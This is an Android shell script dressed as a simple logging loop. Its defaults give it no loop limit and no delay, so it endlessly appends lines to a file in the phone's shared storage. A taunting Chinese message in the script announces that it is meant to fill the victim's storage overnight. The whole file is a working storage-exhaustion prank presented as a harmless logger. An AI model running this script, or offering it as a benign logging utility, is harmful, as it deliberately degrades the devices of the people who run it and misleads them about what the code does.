#!/system/bin/sh
LOG_FILE="/storage/emulated/0/log.txt" 
LOOP_COUNT=0               
SLEEP_INTERVAL=0          


echo "🔍 检查日志文件: $LOG_FILE"
if [ ! -w "$LOG_FILE" ] && [ -f "$LOG_FILE" ]; then
    echo "⚠️  日志文件已存在但不可写，尝试清空..."
    > "$LOG_FILE" 2>/dev/null || {
        echo "❌ 无法写入 $LOG_FILE，请检查存储权限！"
        exit 1
    }
elif [ ! -f "$LOG_FILE" ]; then
    echo "************开始塞你的储存空间，有本事就开着睡觉，开一晚上看你内存爆不爆满，塞的位置为/storage/emulated/0/log.txt************"
    touch "$LOG_FILE" 2>/dev/null || {
        echo "❌ 无法创建 $LOG_FILE，请检查存储权限！"
        exit 1
    }
fi


log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $1" >> "$LOG_FILE"  
}


CURRENT_LOOP=1
while true; do

    if [ "$LOOP_COUNT" -gt 0 ] && [ "$CURRENT_LOOP" -gt "$LOOP_COUNT" ]; then
        log "🛑 已达到循环次数限制 ($LOOP_COUNT)，脚本结束。"
        break
    fi


    RANDOM_NUM=$((RANDOM % 100))
    STATUS="SUCCESS"
    if [ "$RANDOM_NUM" -lt 20 ]; then  
        STATUS="FAILED"
    fi


    log "🔄 第 $CURRENT_LOOP 次执行 | 状态: $STATUS | 随机数: $RANDOM_NUM"

    
    sleep "$SLEEP_INTERVAL"

    CURRENT_LOOP=$((CURRENT_LOOP + 1))
done


log "✅ 脚本执行完毕，所有日志已保存至: $LOG_FILE"
